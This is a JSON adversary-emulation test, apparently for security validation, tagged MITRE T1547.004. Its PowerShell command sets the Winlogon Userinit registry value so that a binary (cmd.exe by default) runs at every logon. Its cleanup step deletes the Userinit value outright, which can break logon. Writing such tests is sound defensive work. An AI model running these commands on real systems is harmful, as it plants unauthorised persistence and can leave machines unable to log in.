{
  "id": "f9b8daff-8fa7-4e6a-a1a7-7c14675a545b",
  "name": "Winlogon HKLM Userinit Key Persistence - PowerShell",
  "description": "PowerShell code to set Winlogon userinit key to execute a binary at logon along with userinit.exe.\n\nUpon successful execution, PowerShell will modify a registry value to execute cmd.exe upon logon/logoff.\n",
  "platforms": [
    "windows"
  ],
  "steps": [
    {
      "id": "bd0218cc-cdf4-4078-b93b-135d627b9a7c",
      "type": "execute-command",
      "data": {
        "command": "Set-ItemProperty \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" \"Userinit\" \"Userinit.exe, #{binary_to_execute}\" -Force\n",
        "command_type": "powershell"
      },
      "elevation_required": false
    },
    {
      "id": "9c9e0076-489c-4abc-9740-9585eb676a92",
      "type": "execute-command",
      "data": {
        "command": "Remove-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" -Name \"Userinit\" -Force -ErrorAction Ignore\n",
        "command_type": "powershell"
      },
      "elevation_required": false
    }
  ],
  "flows": [
    {
      "s": "bd0218cc-cdf4-4078-b93b-135d627b9a7c",
      "p": "on-success",
      "o": "9c9e0076-489c-4abc-9740-9585eb676a92"
    },
    {
      "s": "bd0218cc-cdf4-4078-b93b-135d627b9a7c",
      "p": "on-failure",
      "o": "9c9e0076-489c-4abc-9740-9585eb676a92"
    }
  ],
  "tags": [
    "T1547",
    "T1547.004"
  ],
  "input_arguments": [
    {
      "name": "binary_to_execute",
      "type": "path",
      "description": "Path of binary to execute",
      "value": "C:\\Windows\\System32\\cmd.exe"
    }
  ]
}